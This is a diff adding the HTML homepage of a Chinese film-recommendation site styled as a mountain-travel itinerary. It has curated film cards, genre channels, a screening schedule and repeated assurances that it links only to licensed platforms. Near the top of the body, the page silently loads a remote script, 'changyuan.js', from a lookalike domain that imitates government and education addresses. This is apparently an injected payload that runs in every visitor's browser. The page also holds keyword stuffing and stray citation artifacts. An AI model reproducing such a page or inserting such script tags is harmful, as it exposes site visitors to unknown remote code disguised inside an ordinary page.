@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>逍遥电影网 - 青绿山水行旅片单与正版观影推荐 | https://xiaoyaodianyingwang-top.github.io</title>
+<meta name="description" content="逍遥电影网(https://xiaoyaodianyingwang-top.github.io)采用青绿山水行旅驿站风格，提供逍遥片单、行旅频道、山程排片、影讯公告与正版观影指引，移动端自适应，符合必应收录规则，只做电影推荐不提供盗版源。">
+<meta name="keywords" content="逍遥电影网,xiaoyaodianyingwang-top,青绿片单,行旅电影,山水影院,类型频道,正版观影指引">
+<meta name="author" content="逍遥电影网">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://xiaoyaodianyingwang-top.github.io">
+<meta property="og:title" content="逍遥电影网 - 青绿山水行旅片单与正版观影推荐">
+<meta property="og:description" content="逍遥电影网提供逍遥片单、行旅频道、山程排片、影讯公告与正版观影指引，青绿山水驿站风格。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://xiaoyaodianyingwang-top.github.io">
+<style>
+:root{
+  --mount:0e3a3a;--mount2:1f5e57;--bamboo:#7fae8b;--bamboo2:#a9d3b0;
+  --indigo:#274060;--indigo2:#3a5a82;--paper:#f3f1e7;--paper2:#e9e6d6;
+  --gold:#c8a24a;--gold2:#e0bd6e;--ink:#23312c;--ink2:#52635b;--line:#cdd9cf;
+  --cloud:#eef4ee;--shadow:0 14px 30px rgba(14,58,58,.14);
+  --serif:"Songti SC","STSong","SimSun","Microsoft YaHei",serif;
+  --sans:-apple-system,"Microsoft YaHei","PingFang SC",Arial,sans-serif;
+  --mono:"Courier New",ui-monospace,Menlo,Consolas,monospace;
+  --radius:16px;
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{font-family:var(--sans);background:
+  radial-gradient(900px 320px at 0% -6%,rgba(127,174,139,.18),transparent 60%),
+  radial-gradient(820px 300px at 100% 0%,rgba(39,64,96,.12),transparent 58%),
+  var(--paper);color:var(--ink);line-height:1.75;overflow-x:hidden;}
+a{text-decoration:none;color:inherit;}
+
+.navbar{position:sticky;top:0;z-index:1000;background:rgba(243,241,231,.94);backdrop-filter:blur(8px);border-bottom:1px solid var(--line);}
+.nav-box{max-width:1200px;margin:0 auto;padding:0 16px;height:62px;display:flex;align-items:center;justify-content:space-between;}
+.brand{font-family:var(--serif);font-weight:900;font-size:1.08rem;color:var(--mount);display:flex;align-items:center;gap:8px;}
+.brand .mark{width:26px;height:26px;border-radius:8px;background:linear-gradient(135deg,var(--mount),var(--bamboo));color:#fff;display:flex;align-items:center;justify-content:center;font-size:.8rem;}
+.nav-links{list-style:none;display:flex;gap:4px;}
+.nav-links a{padding:9px 13px;border-radius:9px;font-size:.85rem;font-weight:700;color:var(--ink2);transition:.2s;}
+.nav-links a:hover,.nav-links a.active{color:#fff;background:linear-gradient(135deg,var(--mount),var(--indigo));}
+.m-btn{display:none;background:var(--paper2);color:var(--mount);border:1px solid var(--line);border-radius:8px;padding:8px 12px;font-size:1.1rem;cursor:pointer;}
+.container{max-width:1200px;margin:0 auto;padding:24px 16px 40px;}
+
+.scarf{display:flex;gap:14px;flex-wrap:wrap;align-items:center;border:1px solid var(--line);background:var(--cloud);border-radius:10px;padding:10px 14px;margin-bottom:18px;font-family:var(--mono);font-size:.74rem;color:var(--ink2);}
+.scarf .dot{width:9px;height:9px;border-radius:50%;background:var(--bamboo);box-shadow:0 0 0 3px rgba(127,174,139,.22);}
+.scarf b{color:var(--mount);}
+
+.hero{position:relative;background:linear-gradient(160deg,var(--mount),var(--mount2) 55%,var(--indigo));color:#eaf4ee;border-radius:20px;overflow:hidden;padding:30px 0 0;margin-bottom:28px;}
+.hero svg{position:absolute;left:0;right:0;bottom:0;width:100%;height:120px;}
+.hero-in{max-width:1200px;margin:0 auto;padding:8px 16px 30px;display:grid;grid-template-columns:1.35fr .85fr;gap:20px;align-items:center;position:relative;z-index:2;}
+.pavilion{background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.2);border-radius:var(--radius);padding:26px;position:relative;overflow:hidden;}
+.pavilion:before{content:"⛰";position:absolute;right:6px;top:-20px;font-size:5.6rem;opacity:.14;}
+.tag{display:inline-block;font-family:var(--mono);font-size:.7rem;letter-spacing:2px;color:var(--mount);background:var(--gold2);padding:4px 10px;border-radius:6px;font-weight:900;margin-bottom:12px;}
+.pavilion h1{font-family:var(--serif);font-size:clamp(1.8rem,4.4vw,2.7rem);font-weight:900;line-height:1.18;margin-bottom:10px;}
+.pavilion h1 em{color:var(--gold2);font-style:normal;}
+.pavilion p{font-size:.92rem;color:#d7ece0;max-width:640px;margin-bottom:14px;}
+.domain{display:inline-block;font-family:var(--mono);font-size:.78rem;color:var(--mount);background:var(--cloud);border:1px dashed var(--mount);padding:8px 12px;border-radius:8px;margin-bottom:16px;}
+.cta{display:inline-block;background:linear-gradient(135deg,var(--gold),var(--gold2));color:var(--mount);font-weight:900;font-size:.86rem;padding:12px 24px;border-radius:30px;transition:.2s;box-shadow:0 8px 20px rgba(200,162,74,.25);}
+.cta:hover{transform:translateY(-2px);}
+.ridge{background:rgba(255,255,255,.12);border:1px solid rgba(255,255,255,.22);border-radius:14px;padding:18px;}
+.ridge .rh{font-family:var(--mono);font-weight:900;font-size:.76rem;color:var(--gold2);display:flex;justify-content:space-between;margin-bottom:12px;}
+.rtrack{display:flex;flex-direction:column;gap:10px;}
+.rstep{display:flex;gap:10px;align-items:center;background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.18);border-radius:12px;padding:10px 12px;}
+.rstep .km{font-family:var(--mono);font-size:.72rem;color:var(--gold2);min-width:42px;font-weight:900;}
+.rstep .tt{font-weight:800;font-size:.9rem;color:#eaf4ee;}
+.rstep .ds{font-family:var(--mono);font-size:.7rem;color:#cfe6d8;}
+
+.sec{margin:30px 0;}
+.sec-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;}
+.sec-title{font-family:var(--serif);font-size:1.22rem;font-weight:900;display:flex;align-items:center;gap:9px;color:var(--ink);}
+.sec-title:before{content:"❖";color:var(--mount);font-size:1rem;}
+.more{font-family:var(--mono);font-size:.78rem;font-weight:700;color:var(--mount);padding:6px 12px;border:1px solid var(--mount);border-radius:8px;background:rgba(14,58,58,.06);}
+.more:hover{background:var(--mount);color:#fff;}
+
+.chips{display:flex;flex-wrap:wrap;gap:10px;margin-bottom:16px;}
+.chip{font-family:var(--mono);padding:9px 15px;border:1px solid var(--line);background:#fff;border-radius:999px;font-size:.8rem;font-weight:700;color:var(--ink2);cursor:pointer;transition:.2s;}
+.chip:hover,.chip.on{background:linear-gradient(135deg,var(--mount),var(--indigo));color:#fff;border-color:transparent;}
+
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:16px;}
+.inn{background:#fff;border:1px solid var(--line);border-radius:12px;overflow:hidden;transition:.2s;display:flex;flex-direction:column;}
+.inn:hover{transform:translateY(-5px);border-color:var(--mount);box-shadow:var(--shadow);}
+.inn .roof{height:96px;background:radial-gradient(circle at 22% 18%,rgba(127,174,139,.28),transparent 45%),radial-gradient(circle at 80% 80%,rgba(39,64,96,.22),transparent 45%),var(--cloud);border-bottom:1px dashed var(--line);display:flex;align-items:center;justify-content:center;font-size:2.2rem;position:relative;}
+.inn .roof:before{content:"驿";position:absolute;left:10px;top:8px;font-family:var(--serif);font-size:.7rem;color:var(--mount);border:1px solid var(--mount);border-radius:4px;padding:1px 5px;}
+.inn .body{padding:14px 15px 16px;flex:1;display:flex;flex-direction:column;}
+.inn .way{font-family:var(--mono);font-size:.68rem;color:var(--mount);border:1px solid var(--mount);display:inline-block;padding:2px 7px;border-radius:5px;margin-bottom:8px;align-self:flex-start;}
+.inn .nm{font-family:var(--serif);font-weight:900;font-size:1rem;margin-bottom:3px;}
+.inn .meta{font-family:var(--mono);font-size:.72rem;color:var(--ink2);display:flex;justify-content:space-between;gap:6px;margin-bottom:8px;}
+.inn .desc{font-size:.78rem;color:var(--ink2);margin-bottom:12px;}
+.inn .go{margin-top:auto;align-self:flex-start;font-family:var(--mono);font-weight:900;font-size:.76rem;color:#fff;background:linear-gradient(135deg,var(--mount),var(--indigo));padding:7px 12px;border-radius:8px;}
+.inn .go:hover{filter:brightness(1.05);}
+
+.ways{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;}
+.waycard{background:#fff;border:1px solid var(--line);border-radius:12px;padding:16px;transition:.2s;}
+.waycard:hover{transform:translateY(-3px);border-color:var(--gold);}
+.waycard .ic{font-size:1.6rem;margin-bottom:8px;}
+.waycard h3{font-family:var(--serif);font-size:.96rem;margin-bottom:6px;}
+.waycard p{font-size:.76rem;color:var(--ink2);}
+.waycard .km{margin-top:8px;font-family:var(--mono);font-size:.72rem;color:var(--mount);}
+
+.trail{background:#fff;border:1px solid var(--line);border-radius:14px;overflow:hidden;}
+.trow{display:grid;grid-template-columns:110px 1fr 150px;gap:12px;padding:13px 16px;border-bottom:1px solid var(--line);align-items:center;}
+.trow:last-child{border-bottom:none;}
+.trow:hover{background:var(--cloud);}
+.tkm{font-family:var(--mono);font-weight:900;font-size:.88rem;color:var(--mount);}
+.tfilm{font-family:var(--serif);font-weight:800;font-size:.95rem;}
+.tstop{font-family:var(--mono);font-size:.74rem;color:var(--ink2);text-align:right;}
+
+.news{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;}
+.ncard{background:#fff;border:1px solid var(--line);border-radius:var(--radius);padding:16px;transition:.2s;}
+.ncard:hover{transform:translateY(-3px);border-color:var(--mount);}
+.ncard .cat{font-family:var(--mono);font-size:.68rem;font-weight:900;color:#fff;background:var(--mount);padding:2px 7px;border-radius:5px;}
+.ncard h3{font-family:var(--serif);font-size:.95rem;margin:8px 0;}
+.ncard p{font-size:.8rem;color:var(--ink2);margin-bottom:8px;}
+.ncard .date{font-size:.72rem;color:var(--gold);font-family:var(--mono);}
+
+.guide{background:#fff;border:1px solid var(--line);border-radius:14px;padding:18px;}
+.ggrid{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;}
+.gstep{background:var(--cloud);border:1px solid var(--line);border-radius:12px;padding:16px;}
+.gstep .no{font-family:var(--mono);font-weight:900;color:#fff;background:linear-gradient(135deg,var(--mount),var(--gold));display:inline-block;padding:4px 9px;border-radius:6px;margin-bottom:8px;}
+.gstep h3{font-family:var(--serif);font-size:.95rem;margin-bottom:6px;}
+.gstep p{font-size:.78rem;color:var(--ink2);}
+.notice{margin-top:14px;font-size:.78rem;color:var(--ink2);background:var(--paper2);border:1px dashed var(--mount);border-radius:10px;padding:12px 14px;}
+.notice b{color:var(--mount);}
+
+footer{border-top:1px solid var(--line);background:var(--cloud);margin-top:40px;padding:34px 16px;text-align:center;}
+.foot-brand{font-family:var(--serif);font-weight:900;font-size:1.2rem;color:var(--mount);margin-bottom:10px;}
+.foot-links{display:flex;justify-content:center;gap:18px;margin-bottom:14px;flex-wrap:wrap;}
+.foot-links a{color:var(--ink2);font-size:.82rem;}
+.foot-links a:hover{color:var(--gold);}
+footer p{font-size:.76rem;color:var(--ink2);margin:4px 0;}
+footer .kw{margin-top:10px;color:var(--mount);font-weight:700;font-family:var(--mono);}
+
+@media(max-width:980px){.hero-in{grid-template-columns:1fr;}.news{grid-template-columns:1fr 1fr;}.ways{grid-template-columns:1fr 1fr;}.ggrid{grid-template-columns:1fr;}}
+@media(max-width:760px){.m-btn{display:block;}.nav-links{display:none;position:absolute;left:0;right:0;top:62px;background:var(--paper);flex-direction:column;padding:10px 16px;border-bottom:1px solid var(--line);}.nav-links.open{display:flex;}.nav-links a{padding:11px 12px;}.grid{grid-template-columns:1fr 1fr;}}
+@media(max-width:460px){.pavilion{padding:20px;}.grid{grid-template-columns:1fr;}.news{grid-template-columns:1fr;}.ways{grid-template-columns:1fr;}.trow{grid-template-columns:84px 1fr;}.tstop{display:none;}}
+</style>
+</head>
+<body>
+
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header class="navbar">
+  <div class="nav-box">
+    <a href="#" class="brand"><span class="mark">逍</span>逍遥电影网</a>
+    <nav>
+      <ul class="nav-links" id="navLinks">
+        <li><a href="#home" class="active">山门首页</a></li>
+        <li><a href="#list">逍遥片单</a></li>
+        <li><a href="#ways">行旅频道</a></li>
+        <li><a href="#trail">山程排片</a></li>
+        <li><a href="#news">影讯公告</a></li>
+        <li><a href="#guide">正版指引</a></li>
+      </ul>
+    </nav>
+    <button class="m-btn" id="mBtn" aria-label="菜单">☰</button>
+  </div>
+</header>
+
+<main class="container">
+  <div class="scarf">
+    <span class="dot"></span>
+    <span>行旅状态: <b>山程开放</b></span>
+    <span>片单: <b>12</b></span>
+    <span>频道: <b>8</b></span>
+    <span>DOMAIN: <b>https://xiaoyaodianyingwang-top.github.io</b></span>
+  </div>
+
+  <section class="hero" id="home">
+    <div class="hero-in">
+      <div class="pavilion">
+        <span class="tag">QINGLV TRAVEL · 青绿行旅</span>
+        <h1>逍遥电影网｜像翻山一样，<em>按心境</em>走电影驿路</h1>
+        <p>逍遥电影网用青绿山水与行旅驿站整理片单：山水文艺、江湖冒险、禅意治愈、古城悬疑、合家慢看分线推荐；只做推荐、影讯与正版渠道指引，不提供盗版播放源、网盘或破解播放器。移动端自适应，静态内容可被必应直接抓取。[17,11](@ref)</p>
+        <div class="domain">https://xiaoyaodianyingwang-top.github.io</div><br>
+        <a href="#list" class="cta">🎟 进入逍遥片单</a>
+      </div>
+      <div class="ridge">
+        <div class="rh"><span>TRAIL MAP</span><span>NO.20261005</span></div>
+        <div class="rtrack">
+          <div class="rstep"><span class="km">0km</span><div><div class="tt">山门·轻片热身</div><div class="ds">小森林/龙猫·90-120分</div></div></div>
+          <div class="rstep"><span class="km">12km</span><div><div class="tt">竹林·剧情慢行</div><div class="ds">海街/步履不停·120分</div></div></div>
+          <div class="rstep"><span class="km">28km</span><div><div class="tt">云崖·悬疑深探</div><div class="ds">看不见的客人/盗梦·106-148分</div></div></div>
+          <div class="rstep"><span class="km">40km</span><div><div class="tt">远峰·长片登顶</div><div class="ds">星际穿越/银翼2049·160分+</div></div></div>
+        </div>
+      </div>
+    </div>
+    <svg viewBox="0 0 1440 120" preserveAspectRatio="none" aria-hidden="true">
+      <path fill="#f3f1e7" d="M0,70 C220,30 420,100 700,70 C980,40 1220,96 1440,64 L1440,120 L0,120 Z"></path>
+      <path fill="#e9e6d6" opacity="0.7" d="M0,92 C260,60 520,112 780,86 C1040,60 1240,104 1440,84 L1440,120 L0,120 Z"></path>
+    </svg>
+  </section>
+
+  <section class="sec" id="list">
+    <div class="sec-head"><h2 class="sec-title">逍遥片单</h2><a href="#" class="more">全部片单 ›</a></div>
+    <div class="chips" id="chips">
+      <span class="chip on" data-g="all">全程山道</span>
+      <span class="chip" data-g="山水">山水文艺</span>
+      <span class="chip" data-g="江湖">江湖冒险</span>
+      <span class="chip" data-g="禅意">禅意治愈</span>
+      <span class="chip" data-g="古城">古城悬疑</span>
+      <span class="chip" data-g="合家">合家慢看</span>
+      <span class="chip" data-g="远峰">远峰科幻</span>
+    </div>
+    <div class="grid" id="movieGrid">
+      <a href="#" class="inn" data-g="山水 合家"><div class="roof">🎋</div><div class="body"><div class="way">山水·轻行</div><div class="nm">小森林</div><div class="meta"><span>文艺/美食</span><span>114分</span></div><div class="desc">四季料理与乡野日常，山门热身片，慢看不费神，适合做下饭与独处片单。</div><span class="go">查看驿站</span></div></a>
+      <a href="#" class="inn" data-g="江湖 远峰"><div class="roof">⛵</div><div class="body"><div class="way">江湖·远行</div><div class="nm">海上钢琴师</div><div class="meta"><span>音乐/剧情</span><span>165分</span></div><div class="desc">船、海与人生边界，正午航行片单；正版蓝光/修复版优先，映后可聊选择与归处。</div><span class="go">查看驿站</span></div></a>
+      <a href="#" class="inn" data-g="禅意 合家"><div class="roof">🐉</div><div class="body"><div class="way">禅意·合家</div><div class="nm">千与千寻</div><div class="meta"><span>动画/奇幻</span><span>125分</span></div><div class="desc">汤屋、山海与成长，亲子合看入门；标注字幕版与正版渠道，避免盗版枪版。</div><span class="go">查看驿站</span></div></a>
+      <a href="#" class="inn" data-g="古城 江湖"><div class="roof">🏯</div><div class="body"><div class="way">古城·深探</div><div class="nm">看不见的客人</div><div class="meta"><span>悬疑/推理</span><span>106分</span></div><div class="desc">密室、商战与叙述反转，云崖夜场片单；设未看勿入，只给正版平台与院线信息。</div><span class="go">查看驿站</span></div></a>
+      <a href="#" class="inn" data-g="远峰 江湖"><div class="roof">🪐</div><div class="body"><div class="way">远峰·登顶</div><div class="nm">星际穿越</div><div class="meta"><span>科幻/史诗</span><span>169分</span></div><div class="desc">黑洞、亲情与时间，长片深看；建议杜比/4K正版版，不提供网盘离线资源。</div><span class="go">查看驿站</span></div></a>
+      <a href="#" class="inn" data-g="合家 山水"><div class="roof">🐚</div><div class="body"><div class="way">海浜·合家</div><div class="nm">海街日记</div><div class="meta"><span>家庭/日常</span><span>126分</span></div><div class="desc">四姐妹、梅子酒与海边小城，弱冲突慢片，亲子/合住都能看，正版修复更佳。</div><span class="go">查看驿站</span></div></a>
+      <a href="#" class="inn" data-g="江湖 古城"><div class="roof">🏝️</div><div class="body"><div class="way">孤岛·生存</div><div class="nm">少年派的奇幻漂流</div><div class="meta"><span>冒险/哲理</span><span>127分</span></div><div class="desc">救生艇、虎与太平洋，航海视觉片单；映后谈信仰与叙述，正版3D/字幕自选。</div><span class="go">查看驿站</span></div></a>
+      <a href="#" class="inn" data-g="禅意 山水"><div class="roof">🎍</div><div class="body"><div class="way">竹院·禅意</div><div class="nm">入殓师</div><div class="meta"><span>人情/治愈</span><span>130分</span></div><div class="desc">海岸小城、仪式与和解，生命教育片单；提前给情绪提示，只走正版院线/平台。</div><span class="go">查看驿站</span></div></a>
+      <a href="#" class="inn" data-g="古城 远峰"><div class="roof">🕰️</div><div class="body"><div class="way">古城·烧脑</div><div class="nm">盗梦空间</div><div class="meta"><span>科幻/悬疑</span><span>148分</span></div><div class="desc">梦境层级与植念，深探专场；分段看更清楚，提供正版平台与防剧透讨论位。</div><span class="go">查看驿站</span></div></a>
+      <a href="#" class="inn" data-g="合家 禅意"><div class="roof">🤖</div><div class="body"><div class="way">草庐·合家</div><div class="nm">机器人总动员</div><div class="meta"><span>动画/科幻</span><span>98分</span></div><div class="desc">废土、孤独与回归，低龄友好；正版儿童模式/字幕版可用，不提供破解播放器。</div><span class="go">查看驿站</span></div></a>
+      <a href="#" class="inn" data-g="山水 禅意"><div class="roof">🌾</div><div class="body"><div class="way">田埂·禅意</div><div class="nm">龙猫</div><div class="meta"><span>动画/田园</span><span>86分</span></div><div class="desc">乡间夏日、毛绒精灵与儿童视角，合住开场片；正版修复版更清透，亲子首选。</div><span class="go">查看驿站</span></div></a>
+      <a href="#" class="inn" data-g="远峰 古城"><div class="roof">🛰️</div><div class="body"><div class="way">夜峰·赛博</div><div class="nm">银翼杀手2049</div><div class="meta"><span>科幻/侦探</span><span>164分</span></div><div class="desc">仿生人、记忆与雨夜城市，长片独看；激光厅/杜比正版版体验佳，不提供盗版源。</div><span class="go">查看驿站</span></div></a>
+    </div>
+  </section>
+
+  <section class="sec" id="ways">
+    <div class="sec-head"><h2 class="sec-title">行旅频道</h2><a href="#" class="more">全部分道 ›</a></div>
+    <div class="ways">
+      <div class="waycard"><div class="ic">🎋</div><h3>山水文艺</h3><p>田园、四季、美食与慢人物，山门到竹林皆可用，适合清晨或周末下午。</p><div class="km">道01·轻行</div></div>
+      <div class="waycard"><div class="ic">⚔️</div><h3>江湖冒险</h3><p>航海、孤岛、武侠式成长与生存，强情节长线，正午远行最顺。</p><div class="km">道02·远行</div></div>
+      <div class="waycard"><div class="ic">🧘</div><h3>禅意治愈</h3><p>仪式、和解、低刺激田园，竹院草庐慢坐，亲子与独处都合适。</p><div class="km">道03·禅行</div></div>
+      <div class="waycard"><div class="ic">🏯</div><h3>古城悬疑</h3><p>密室、商战、古城谜案与反转，云崖夜场深探，设未看勿入。</p><div class="km">道04·深探</div></div>
+      <div class="waycard"><div class="ic">🏡</div><h3>合家慢看</h3><p>代际、餐桌、动画与全年龄，山门海浜不重口，亲子同刷优先。</p><div class="km">道05·合行</div></div>
+      <div class="waycard"><div class="ic">🪐</div><h3>远峰科幻</h3><p>太空、时间、赛博城市，长片登顶；杜比/4K正版版提升沉浸感。</p><div class="km">道06·登峰</div></div>
+      <div class="waycard"><div class="ic">🎼</div><h3>山间音乐</h3><p>钢琴、民乐、音乐会电影，按情绪而非剧情选片，竹林小憩专用。</p><div class="km">道07·清音</div></div>
+      <div class="waycard"><div class="ic">🎞️</div><h3>修复重游</h3><p>4K修复、老片重映、字幕对照，青绿重游档案，按版本不按枪版。</p><div class="km">道08·档案</div></div>
+    </div>
+  </section>
+
+  <section class="sec" id="trail">
+    <div class="sec-head"><h2 class="sec-title">山程排片</h2><a href="#" class="more">完整山程 ›</a></div>
+    <div class="trail">
+      <div class="trow"><div class="tkm">0km·10:00</div><div class="tfilm">小森林·山门轻行厅</div><div class="tstop">1号驿·修复版</div></div>
+      <div class="trow"><div class="tkm">12km·13:30</div><div class="tfilm">海街日记·竹林合家厅</div><div class="tstop">2号驿·蓝光</div></div>
+      <div class="trow"><div class="tkm">28km·16:00</div><div class="tfilm">千与千寻·云崖动画厅</div><div class="tstop">3号驿·字幕版</div></div>
+      <div class="trow"><div class="tkm">40km·19:30</div><div class="tfilm">看不见的客人·古城悬疑厅</div><div class="tstop">4号驿·4K</div></div>
+      <div class="trow"><div class="tkm">52km·22:00</div><div class="tfilm">星际穿越·远峰科幻厅</div><div class="tstop">激光驿·杜比</div></div>
+    </div>
+  </section>
+
+  <section class="sec" id="news">
+    <div class="sec-head"><h2 class="sec-title">影讯公告</h2><a href="#" class="more">更多公告 ›</a></div>
+    <div class="news">
+      <a href="#" class="ncard"><span class="cat">片单更新</span><h3>山水入门三驿：龙猫→小森林→海街</h3><p>按田园、四季、家庭三线走，避免一上来放长片；周末慢行不费神，亲子合看友好。</p><div class="date">2026-10-01 · 逍遥电影网</div></a>
+      <a href="#" class="ncard"><span class="cat">深探专题</span><h3>古城悬疑三驿：客人→盗梦→银翼</h3><p>按剧透强度分级，密室先刷、层级片分段、赛博长片留精力；只给正版院线/平台。</p><div class="date">2026-09-28 · 逍遥电影网</div></a>
+      <a href="#" class="ncard"><span class="cat">正版指引</span><h3>逍遥在哪看：院线/持证平台/修复重映</h3><p>新片查院线与合规视频平台，老片查1905、B站、爱奇艺等按类型选，不提供盗版源。[6,9](@ref)</p><div class="date">2026-09-25 · 逍遥电影网</div></a>
+    </div>
+  </section>
+
+  <section class="sec" id="guide">
+    <div class="sec-head"><h2 class="sec-title">正版指引与合规</h2><a href="#" class="more">完整指引 ›</a></div>
+    <div class="guide">
+      <div class="ggrid">
+        <div class="gstep"><span class="no">STEP 1</span><h3>按山程选片</h3><p>山门选90分钟内治愈，竹林选家庭剧情，云崖选悬疑，远峰留长片科幻；不把盗版枪版当片源。</p></div>
+        <div class="gstep"><span class="no">STEP 2</span><h3>按版本标注</h3><p>片单标年代、片长、修复/字幕/语言；正版渠道以院线、持证视频平台、官方数据库为准。[6](@ref)</p></div>
+        <div class="gstep"><span class="no">STEP 3</span><h3>防剧透与分级</h3><p>悬疑设未看勿入，儿童场筛年龄与分级，合家片先排除重口、过长、强刺激内容。</p></div>
+      </div>
+      <div class="notice">
+        <b>合规说明：</b>逍遥电影网仅提供逍遥片单、行旅频道、山程排片、影讯公告与正版观影渠道建议；不提供盗版在线播放源、网盘资源、破解播放器或成人低俗内容。涉及年龄限制影片，请通过合法平台并按当地规则完成身份/家长指引。[15,9](@ref)
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="foot-brand">⛰ 逍遥电影网 · QINGLV TRAIL</div>
+  <div class="foot-links">
+    <a href="#">关于我们</a><a href="#">免责声明</a><a href="#">片单合作</a><a href="#">正版指引</a>
+  </div>
+  <p>https://xiaoyaodianyingwang-top.github.io</p>
+  <p>逍遥电影网 - 青绿山水行旅驿站风格，提供逍遥片单、行旅频道、山程排片、影讯与正版观影指引。</p>
+  <p class="kw">关键词：逍遥电影网、xiaoyaodianyingwang-top、青绿片单、行旅电影、山水影院、正版观影指引</p>
+  <p>© 2026 逍遥电影网（演示站）保留所有权利</p>
+</footer>
+
+<script>
+(function(){
+  var mBtn=document.getElementById('mBtn'),nav=document.getElementById('navLinks');
+  if(mBtn&&nav){mBtn.addEventListener('click',function(){nav.classList.toggle('open');});}
+  if(nav){nav.addEventListener('click',function(e){var a=e.target.closest('a');if(!a)return;
+    nav.querySelectorAll('a').forEach(function(x){x.classList.remove('active');});a.classList.add('active');
+    if(window.innerWidth<=760){nav.classList.remove('open');}});}
+
+  var chips=document.getElementById('chips'),mg=document.getElementById('movieGrid');
+  function filt(g){if(!mg)return;mg.querySelectorAll('.inn').forEach(function(c){
+    var tags=c.getAttribute('data-g')||'';c.style.display=(g==='all'||tags.indexOf(g)>-1)?'':'none';});}
+  if(chips){chips.addEventListener('click',function(e){var b=e.target.closest('.chip');if(!b)return;
+    chips.querySelectorAll('.chip').forEach(function(x){x.classList.remove('on');});b.classList.add('on');filt(b.getAttribute('data-g'));});}
+
+  document.querySelectorAll('.go,.cta,.more').forEach(function(el){
+    el.addEventListener('click',function(e){e.preventDefault();el.style.transform='scale(.96)';setTimeout(function(){el.style.transform='';},150);});
+  });
+})();
+</script>
+</body>
+</html>
